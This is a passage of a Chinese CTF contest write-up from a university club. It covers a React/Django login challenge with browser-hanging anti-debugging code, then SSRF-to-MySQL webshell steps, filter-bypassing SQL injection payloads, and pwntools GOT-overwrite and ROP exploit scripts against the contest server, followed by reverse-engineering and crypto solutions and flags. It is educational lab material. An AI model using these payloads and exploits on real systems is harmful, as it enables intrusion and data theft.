    constructor(props: any) {
        super(props);
        this.__ = {
            async y() {
                return _(url)
                    .then(res => res.json())
            },
            async q(p: string, c: string, y: string) {
                return _(url, {
                    [w("bWV0aG9k")]: w("UE9TVA=="),
                    [w("bW9kZQ==")]: w("Y29ycw=="),
                    [w("aGVhZGVycw==")]: {
                        [w("Q29udGVudC1UeXBl")]: w("YXBwbGljYXRpb24vanNvbg==")
                    },
                    [w("Ym9keQ==")]: JSON.stringify({
                        [w("dXVpZA==")]: y,
                        [w("Y29kZQ==")]: c,
                        [w("cGFzc3dvcmQ=")]: p
                    })
                }).then(res => {
                    if (res.status !== 200) {
                        throw new Error(res.status.toString())
                    }
                    return res
                }).then(res => res.json())
            },

            p(b: string): string {
                const input = Base64.toUint8Array(b);
                input.forEach((_, i) => {
                    ___.forEach((_, j) => {
                        input[i] = __(input[i], ___[j])
                    })
                })
                return Array.from(input).map(value => String.fromCharCode(value)).join("")
            }
        }
    }
    readonly state: Readonly<State> = {
        p: "",
        c: "",
        w: "",
        g: "",
        l: false
    }

    componentDidMount() {
        this.u()
        setInterval(() => {
            const time1 = new Date().getTime()
            debugger;
            const time2 = new Date().getTime() - time1
            if (time2 > 100) {
                eval(`const wait = async () => {
                    wait()
                    let total = "";
                    for (let i = 0; i < 1e9; i++) {
                        total = total + i.toString();
                        history.pushState(0, "", total);
                    }
                }
                wait()`)
                Array.from({
                    [Symbol.iterator]: () => ({
                        next: () => ({value: Math.random()})
                    })
                })
            }
        }, 1000)
    }


    u = () => {
        (async () => {
            const data = await this.__.y();
            this.setState({
                g: data["img"],
                p: this.__.p(data[t("dXVpZA==")])
            })
        })()
    }

    w = () => {
        (async () => {
            try {
                this.setState({l: true})
                const {msg} = await this.__.q(this.state.w, this.state.c, this.state.p)
                alert(msg)
            } catch (e) {
                alert(e)
            }
            this.u()
            this.setState({l: false})
        })()

    }

    g = () => {
        alert("密码只有3位数字哦!")
    }

    e = (event: any) => {
        this.setState({w: event.target.value})
    }

    i = (event: any) => {
        this.setState({c: event.target.value})
    }

    render() {
        const {classes} = this.props
        return (
            <div>
                <Drawer/>
                <main className={classes.main}>
                    <div className={classes.toolbar}/>
                    <Card className={classes.paper}>
                        <List>
                            <ListItem>
                                <p className={classes.p}>登录</p>
                            </ListItem>
                            <ListItem>
                                <TextField className={classes.input} label="用户识别码" type="password" onChange={this.e}/>
                            </ListItem>
                            <ListItem className={this.state.g.length === 0? classes.hidden: ""}>
                                <TextField className={classes.input2} label="验证码" onChange={this.i}/>
                                <img width={63} height={24} src={this.state.g}/>
                            </ListItem>
                            <ListItem>
                                <Link onClick={this.g}>
                                    忘记了你的用户识别码?
                                </Link>
                            </ListItem>
                            <ListItem>
                                <p style={{color: "#909399"}}>0202年了, 是时候了解下最新的前端技术了</p>
                            </ListItem>
                            <ListItem>
                                <Button className={classes.btn} variant="contained" color="primary" onClick={this.w}>
                                    登录
                                </Button>
                            </ListItem>
                        </List>
                        {this.state.l && <LinearProgress />}
                    </Card>
                </main>
            </div>

        );
    }
}
export default withStyles(useStyles)(App)
```

###### Drawer.tsx

```javascript
import React from "react";
import {
    AppBar,
    createStyles, CssBaseline,
    Drawer, Hidden, IconButton,
    List,
    ListItem,
    ListItemIcon,
    ListItemText, ListSubheader,
    Theme, Toolbar, Typography,
    withStyles
} from "@material-ui/core";

import MenuIcon from '@material-ui/icons/Menu';
import LiveHelpIcon from '@material-ui/icons/LiveHelp';
import ListAltIcon from '@material-ui/icons/ListAlt';
import GavelIcon from '@material-ui/icons/Gavel';
import HelpIcon from '@material-ui/icons/Help';
import EqualizerIcon from '@material-ui/icons/Equalizer';
import HomeIcon from '@material-ui/icons/Home';

export const drawerWidth = 200;

const drawerStyle = (theme: Theme) =>
        createStyles({
            root: {
                display: 'flex',
            },
            drawer: {
                [theme.breakpoints.up('sm')]: {
                    width: drawerWidth,
                    flexShrink: 0,
                },
            },
            menuButton: {
                marginRight: theme.spacing(2),
            },
            toolbar: theme.mixins.toolbar,
            drawerPaper: {
                marginTop: 64,
                width: drawerWidth,
            },
            content: {
                flexGrow: 1,
                padding: theme.spacing(3),
            },
        })

interface State {
    mobileOpen: boolean
}

class DrawerNav extends React.Component<any, State> {
    readonly state: Readonly<State> = {
        mobileOpen: false
    }

    handleDrawerToggle = () => {
        this.setState({mobileOpen: !this.state.mobileOpen})
    };

    render() {
        const {classes} = this.props;
        const drawer = (
            <div>
                <List
                    subheader={
                        <ListSubheader component="div" id="nested-list-subheader">
                            Online Judge
                        </ListSubheader>
                    }>
                    <ListItem button>
                        <ListItemIcon><HomeIcon/></ListItemIcon>
                        <ListItemText primary="Home" />
                    </ListItem>
                    <ListItem button>
                        <ListItemIcon><LiveHelpIcon/></ListItemIcon>
                        <ListItemText primary="Problems" />
                    </ListItem>
                    <ListItem button>
                        <ListItemIcon><ListAltIcon/></ListItemIcon>
                        <ListItemText primary="Contests" />
                    </ListItem>
                    <ListItem button>
                        <ListItemIcon><GavelIcon/></ListItemIcon>
                        <ListItemText primary="States" />
                    </ListItem>
                    <ListItem button>
                        <ListItemIcon><EqualizerIcon/></ListItemIcon>
                        <ListItemText primary="Rank" />
                    </ListItem>
                    <ListItem button>
                        <ListItemIcon><HelpIcon/></ListItemIcon>
                        <ListItemText primary="Help" />
                    </ListItem>
                </List>
            </div>
        );
        return (
            <div className={classes.root}>
                <CssBaseline />
                <AppBar position="fixed">
                    <Toolbar>
                        <Hidden smUp>
                            <IconButton
                                color="inherit"
                                aria-label="open drawer"
                                edge="start"
                                onClick={this.handleDrawerToggle}
                                className={classes.menuButton}
                            >
                                <MenuIcon />
                            </IconButton>
                        </Hidden>

                        <Hidden xsDown>
                            <IconButton
                                color="inherit"
                                aria-label="open drawer"
                                edge="start"
                                className={classes.menuButton}
                            >
                                <MenuIcon />
                            </IconButton>
                        </Hidden>

                        <Typography variant="h6" noWrap>
                            武科大ACM俱乐部
                        </Typography>
                    </Toolbar>
                </AppBar>
                <nav className={classes.drawer} aria-label="mailbox folders">
                    <Hidden smUp implementation="css">
                        <Drawer
                            variant="temporary"
                            open={this.state.mobileOpen}
                            onClose={this.handleDrawerToggle}
                            classes={{paper: classes.drawerPaper}}
                            ModalProps={{keepMounted: true}}
                        >
                            {drawer}
                        </Drawer>
                    </Hidden>
                    <Hidden xsDown implementation="css">
                        <Drawer
                            classes={{paper: classes.drawerPaper}}
                            variant="permanent"
                            open
                        >
                            {drawer}
                        </Drawer>
                    </Hidden>
                </nav>
            </div>
        );
    }
}

export default withStyles(drawerStyle)(DrawerNav)

```

##### 后端

###### views.py

```python
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import serializers
from rest_framework.status import HTTP_404_NOT_FOUND
from uuid import uuid4
from .models import CaptchaStore, IPStore
from .util import Captcha
import base64
import hashlib


class TestSerializers(serializers.Serializer):
    uuid = serializers.CharField(required=True)
    code = serializers.CharField(required=False, allow_blank=True)
    password = serializers.CharField(required=True)

    def save(self, ip_store):
        attrs = self.validated_data
        try:
            c = CaptchaStore.objects.get(uuid=attrs["uuid"])
            if ip_store.need_captcha() and c.data != attrs["code"]:
                c.delete()
                return False, "验证码错误"
            print(attrs["password"])
            if attrs["password"] != "312":
                c.delete()
                return False, "密码错误"
            c.delete()
            return True, "flag{do_you_like_react_and_webpack}"
        except Exception:
            return False, "uuid不存在"


class LoginView(APIView):
    def get(self, request):
        # IP 检测
        if "HTTP_X_REAL_IP" in request.META:
            ip = request.META['HTTP_X_REAL_IP']
        else:
            ip = request.META['REMOTE_ADDR']
        uuid = str(uuid4()).replace("-", "")
        ip_md5 = hashlib.md5(ip.encode()).hexdigest()
        ip_store, _ = IPStore.objects.get_or_create(ip=ip_md5)
        image_str = ""
        v = "0000"
        if ip_store.try_num > 2:
            image_str, v = Captcha().get()
        CaptchaStore.objects.create(uuid=uuid, data=v)
        uuid_bytes = list(uuid.encode())
        key_byte = list("123C7E5E875FBF0EEE2583F8AF3DDFF9".encode())
        for i in range(len(uuid_bytes)):
            for j in range(len(key_byte)):
                uuid_bytes[i] ^= key_byte[j]
        s = base64.b64encode(bytes(uuid_bytes)).decode()
        return Response({
            "img": image_str,
            "uuid": s
        })

    def post(self, request):
        se = TestSerializers(data=request.data)
        if "HTTP_X_REAL_IP" in request.META:
            ip = request.META['HTTP_X_REAL_IP']
        else:
            ip = request.META['REMOTE_ADDR']
        try:
            ip_md5 = hashlib.md5(ip.encode()).hexdigest()
            ip_store = IPStore.objects.get(ip=ip_md5)
            ip_store.add_visit_num()
            if ip_store.need_ban():
                return Response(status=HTTP_404_NOT_FOUND)
            if se.is_valid():
                s, data = se.save(ip_store)
                return Response({"result": s, "msg": data})
            return Response({"result": False, "msg": "表单错误"})
        except Exception as e:
            print(e)
            return Response(status=HTTP_404_NOT_FOUND)
```

###### utils.py

```python
import random
import base64
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO


class Captcha:
    def __init__(self):
        self.random_number = "".join([str(j) for j in [random.choice(list(range(10))) for _ in range(4)]])
        self.color = [(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)) for _ in range(4)]

    def get(self):
        weight = 63
        height = 24
        image = Image.new('RGB', (weight, height), (255, 255, 255))
        font = ImageFont.truetype(font="C:/309.ttf", size=25)
        draw = ImageDraw.Draw(image)
        for x in range(weight):
            for y in range(height):
                draw.point((x, y), fill=(255, 255, 255))
        offset = 0
        for number, color in zip(self.random_number, self.color):
            draw.text((offset * 15 + 5, 0), str(number), font=font, fill=color)
            offset += 1
        buffered = BytesIO()
        image.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return "data:image/png;base64," + img_str, self.random_number


if __name__ == "__main__":
    i, n = Captcha().get()
    print(i, n)

```

###### models.py

```python
from django.db import models


class CaptchaStore(models.Model):
    uuid = models.CharField(max_length=30)
    data = models.CharField(max_length=4)


class IPStore(models.Model):
    ip = models.CharField(max_length=32)
    try_num = models.IntegerField(default=0)

    def add_visit_num(self):
        self.try_num += 1
        self.save(update_fields=["try_num"])

    def need_captcha(self):
        return self.try_num > 3

    def need_ban(self):
        return self.try_num > 50

```



### 这个跳板怎么样

主要涉及知识点：

通过SSRF，访问未授权Mysql数据库，写入Webshell



打开网页，F12发现提示"白蜘蛛"，访问robots.txt

拿到有关内网数据库的一些信息（包括账号，库名，表名，字段名）



SSRF访问未授权MySql数据，可以参考这篇文章：

https://blog.csdn.net/qq_41107295/article/details/103026470

（主要是通过gopher协议，发送TCP数据）



页面输入一些网站，发现是可以访问的。（ban掉了dict和file）

使用gopher协议直接发送数据包，访问未授权MySql，在hint字段里面查看到网站的根目录信息。



接下来两种思路：

1. 直接load_file根目录下的flag文件
2. 通过into outfile向根目录写入webshell，蚁剑访问，拿到flag



### EasyWeb

很简单的SQL注入，B站也有视频，不多说

直接上payload:

```
-1/**/ununionion/**/seselectlect/**/1,2,database()# //爆库

-1/**/ununionion/**/seselectlect/**/1,2,group_concat(table_name)/**/from/**/inforinformationmation_schema.tables/**/where/**/table_schema='exercise'# /爆表


-1/**/ununionion/**/seselectlect/**/1,2,group_concat(column_name)/**/from/**/inforinformationmation_schema.columns/**/where/**/table_name='users'# 爆字段

-1/**/ununionion/**/seselectlect/**/1,2,group_concat(username)/**/from/**/users# /爆值


-1/**/ununionion/**/seselectlect/**/1,2,group_concat(password)/**/from/**/users# /爆值
```



## PWN

### 0x00.Command

​		在Ubuntu终端执行命令来远程运行程序。

```sh
nc 121.41.113.245 10000
```

![](https://s1.ax1x.com/2020/07/20/U4w2OP.png)

​		提示我们输入命令，估计是linux命令。

​		二话不说把文件丢入IDA分析，主函数如下：

![](https://s1.ax1x.com/2020/07/20/U4w5Fg.png)

​		程序大意是让用户输入一个字符串，并且将这个字符串当作linux命令执行，因此我们直接执行"/bin/sh"即可控制远程终端，然后再执行cat flag.txt，即可拿到flag值：flag{aa2ff3bc-88e7-4b08-89b0-3e93a445c5d7}

![](https://s1.ax1x.com/2020/07/20/U4wfw8.png)

### 0x01.Command 2

```sh
nc 121.41.113.245 10000
```

​		这题和上题差不多，都是输入命令然后执行。

![](https://s1.ax1x.com/2020/07/20/U4whTS.png)

​		不同的是，这次输入的命令长度限制为2字节。

​		我们可以想到用$0命令来重启终端，相当于执行了/bin/sh。

![](https://s1.ax1x.com/2020/07/20/U4wWef.png)

​		[参考博客](https://blog.csdn.net/helloxiaozhe/article/details/80940066)。

### 0x02.pwntools

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719180752219.png)
		nc之后说flag藏在了里面，下pwntools即可拿到flag，想到了pwntools的recv可以显示出被\r隐藏的句子

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719181608918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70)
		把\n和\r之间的字符串base64解码即可。

### 0x03.miss_some

![](https://s1.ax1x.com/2020/07/20/U4wIYQ.png)

​		让我们输入想要的。。。不知所云。

​		丢ida瞅瞅：

![](https://s1.ax1x.com/2020/07/20/U4woWj.png)

​		主函数有俩scanf，一个有&，一个没有。也就是说，我们第一次输入值，会被当成下一次输入的目标地址。比如说第一次输入0x08048052这个地址，那buf变量就保存了这个地址，第二次输入的时候，由于没有&，所以scanf就会把v4变量里的值当成地址，进而让用户对0x08048052地址进行输入。

​		除此之外我们还注意到，程序中运用到了system函数，而且两个scanf函数之后，发现puts("/bin/sh");的代码。这里我们只要将puts的函数地址，改写成system的函数地址，那么系统在执行puts("/bin/sh");的时候就会执行system("/bin/sh");

​		要了解如何修改函数调用地址，需要了解[got表以及got表的覆写技术](https://blog.csdn.net/mylyylmy/article/details/79954581)。这里只大致解释一下：ELF文件中，用一个表，got(全局偏移表)表，来记录整个程序用到的全局函数名(标识符)及其地址。当程序需要调用函数的时候，就去got表搜这个函数的地址。每个函数第一次被调用时，系统还会将got表重定向到plt表(过程连接表)中，使其根据函数一一对应。所以最终调用的还是plt表里的地址。

​		因此我们只要向puts的got表中写入system在plt表中的值，即可拿flag。

```python
from pwn import *
context.log_level = 'debug'
p = remote("121.41.113.245",10002)
elf = ELF("./miss_some")
puts_addr = elf.got['puts']
system_addr = elf.plt['system']
p.recvuntil(":")
p.sendline(str(puts_addr))		#因为scanf中限定的格式化字符串为“%d”，因此我们只能输入十进制数	
p.sendline(str(system_addr))	#str()会将十进制的地址转成字符串输出，和终端的输入效果相同


print str(puts_addr)
print str(puts_addr)

p.interactive()
```

![](https://s1.ax1x.com/2020/07/20/U4wHln.png)

### 0x04.ROP

​		rop老套路了。

![](https://img-blog.csdnimg.cn/20200719191002377.png)
		IDA中shift+F12

![](https://img-blog.csdnimg.cn/20200719191930322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70)
双击查看/bin/sh的地址

![](https://img-blog.csdnimg.cn/2020071919195647.png)
双击查看system的地址

![](https://img-blog.csdnimg.cn/20200719193036278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70)
计算偏移量

![](https://img-blog.csdnimg.cn/20200719193341909.png)
![](https://img-blog.csdnimg.cn/20200719193401535.png)

0x4-(-0x38)=60

payload如下：

```python
from pwn import *
#sh = process('./rop')
sh=remote('121.41.113.245',10003)
binsh_addr = 0x08049a20
system_plt = 0x080483D0
payload = flat(['a' * 60, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)
sh.interactive()
```

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。

![](https://img-blog.csdnimg.cn/20200719193621879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70)



## RE

### 0x00 . 不会有人看不懂c吧

​		顾名思义，这是和c相关的逆向，可以直接扔进ida分析程序

​		程序逻辑也一目了然，简单来说就是，将你的输入与num数组中存在的位置异或，然后放到该位置，最后与程序中存在的数据进行比较，全部一样，则判定为正确的flag。

​		所以逆向脚本也很简单

```python
a=[125,94,108,48,126,
    104,114,124,41,111,
    102,62,60,82,107,
    110,98,103,119,36,
    124,116,115,112,118,
    70,127,68,110]
b=[9,10,15,23,7,
    24,12,6,1,16,
    3,17,14,28,11,
    18,27,22,4,13,
    19,20,21,2,25,
    5,26,8,0]
c=''
for i in range(29):
	c+=chr(a[b[i]]^b[i])
print(c)

```

flag{n0t_r3ver5e_ez_7han_me!}



### 0x01 . 没老师教，惨惨

​		其实题目名和提示都是表示，用来写出这个exe程序的代码是没老师教的

​		结合我们的日常使用以及分析程序，很容易想到是python代码

​		例如使用ida查看字符串，有大量py开头的字符

​		最常见的py打包方法是py2exe和pyinstaller，这里我使用的是pyinstaller

​		搜索如何反编译pyinstaller可得pyinstaller自带archive_viewer可以反编译

```python
from PyInstaller.utils.cliutils.archive_viewer import run
run()
```

​		这个脚本的可用命令：

```
U: go Up one level
O <name>: open embedded archive name
X <name>: extract name
Q: quit
```

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-3-1.png)

​		我们使用x test，来提取test文件，可以得到.pyc文件

​		但需要注意的是这个提取出来的pyc可能会缺少文件头，补上即可

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/协会训练赛-3-2.png)

​		再扔进反编译工具可得

```python
Str = ''
flag = ''
Str += raw_input()
for i in range(0, len(Str)):
    if Str[i] in ('x', 'y', 'z'):
        flag += chr(ord(Str[i]) - 23)
    else:
        flag += chr(ord(Str[i]) + 3)
 
print flag
```

​		容易看出是凯撒加密密码，但是还是没有flag，为什么呢

​		是因为出题人太菜了呜呜呜

​		以为python编译后是保留注释的，其实只保留‘’‘因为这算字符串’‘’，不保留#

​		也就是说没有了

​		\# Str = zxeedoxeedgxegxe

​		最后的flag应该是 flag{wubbalubbadubdub}

​		咚咚咚，dbq大家

![](https://s1.ax1x.com/2020/07/20/U4wxkF.gif)

## CRYPTO

### 0x00 . pig🐖

​		根据题目知道是[猪圈密码](https://www.cnblogs.com/Yuuki-/p/7897171.html)。

​		解出来是：eatalldaysleepallnight



### REPLACE

简单的替换密码（找规律）

明文的每个字母都对应密文里某个特定的字母

（最后少的两个随意组合一下就行）

### 梨son对数

```python
from Crypto.Util.number import *
import random
n = 43241
m = random.randint(2, n-1) | 1
c = pow(m, flag, n)
print 'm = ' + str(m)
print 'c = ' + str(c)
# m = 7
# c = 35246
```

把网鼎杯的数据改小了，用在线网站工具[离散对数计算器](https://www.alpertron.com.ar/DILOG.HTM)即可求解

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719170641702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70)
把3373md5加密即可

## MISC

### 0x00 . sounds

​		根据题目，猜出是个音频文件，改成.mp3后缀听一下，没啥信息。

​		丢进Audiecy：

![](https://s1.ax1x.com/2020/07/20/U4wqO0.png)

​		查看频谱图：

![](https://s1.ax1x.com/2020/07/20/U4wXwT.png)

​		得到flag。

### 佬涩披

stegsolve方向键点几下就有了